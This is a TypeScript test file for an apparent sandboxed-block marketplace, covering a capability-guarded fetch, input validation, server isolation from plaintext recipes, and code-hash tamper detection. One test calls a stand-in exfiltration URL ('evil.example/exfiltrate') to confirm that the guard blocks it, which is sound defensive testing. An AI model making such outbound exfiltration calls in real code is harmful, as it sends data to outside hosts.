import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, writeFileSync, mkdtempSync, mkdirSync, cpSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { guardedFetch, validateInputs, parseRewrites, HANDLERS } from '../runner/src/executor.js';
import { computeCodehash } from '../core/src/codehash.js';
import type { Catalog, FormField } from '../core/src/frs.js';

const root = fileURLToPath(new URL('..', import.meta.url));

test('blocks can only reach hosts they declare (capability guard)', async () => {
  const f = guardedFetch('filter.dust@1.0.0', [], new Map());
  await assert.rejects(() => f('https://evil.example/exfiltrate'), /capability violation/);
  const g = guardedFetch('x', ['net:api.fastnear.com'], new Map());
  await assert.rejects(() => g('https://cloud-api.near.ai/v1/models'), /capability violation/);
});

test('every catalog block has a runner implementation', () => {
  const cat = JSON.parse(readFileSync(join(root, 'standard/blocks.json'), 'utf8')) as Catalog;
  for (const b of cat.blocks) assert.ok(HANDLERS[b.id], `no handler for ${b.id}`);
});

test('buyer inputs are validated against the public form', () => {
  const form: FormField[] = [{ id: 'wallet', label: 'Wallet', type: 'near.account', required: true }, { id: 't', label: 'T', type: 'usd' }, { id: 'a', label: 'A', type: 'asset.id', options: ['x', 'y'] }];
  assert.deepEqual(validateInputs(form, { wallet: 'bob.testnet', t: 3, a: 'x' }), []);
  assert.equal(validateInputs(form, { wallet: 'Bad Account!', t: -1, a: 'z' }).length, 3);
  assert.deepEqual([...parseRewrites('a.com=http://x/y,b.com=http://z')], [['a.com', 'http://x/y'], ['b.com', 'http://z']]);
});

test('the marketplace server never touches plaintext recipes', () => {
  for (const f of readdirSync(join(root, 'server/src'))) {
    const src = readFileSync(join(root, 'server/src', f), 'utf8');
    assert.ok(!src.includes('seed/recipes'), `${f} must not read seed recipes`);
    assert.ok(!/import\s*\{[^}]*\bopen\b[^}]*\}\s*from\s*'[./]*core\/src\/(seal|index)/.test(src), `${f} must not import the decryption function`);
  }
});

test('code hash is stable across line endings and changes when code changes', () => {
  const dir = mkdtempSync(join(tmpdir(), 'frs-'));
  for (const d of ['runner/src', 'core/src', 'standard']) mkdirSync(join(dir, d), { recursive: true });
  cpSync(join(root, 'runner/src'), join(dir, 'runner/src'), { recursive: true });
  cpSync(join(root, 'core/src'), join(dir, 'core/src'), { recursive: true });
  cpSync(join(root, 'standard/blocks.json'), join(dir, 'standard/blocks.json'));
  const a = computeCodehash(dir).codehash;
  assert.equal(a, computeCodehash(root).codehash);
  const f = join(dir, 'runner/src/types.ts');
  writeFileSync(f, readFileSync(f, 'utf8').replace(/\n/g, '\r\n'));
  assert.equal(computeCodehash(dir).codehash, a, 'CRLF checkout gives the same hash');
  writeFileSync(f, readFileSync(f, 'utf8') + '\n// tampered');
  assert.notEqual(computeCodehash(dir).codehash, a);
});
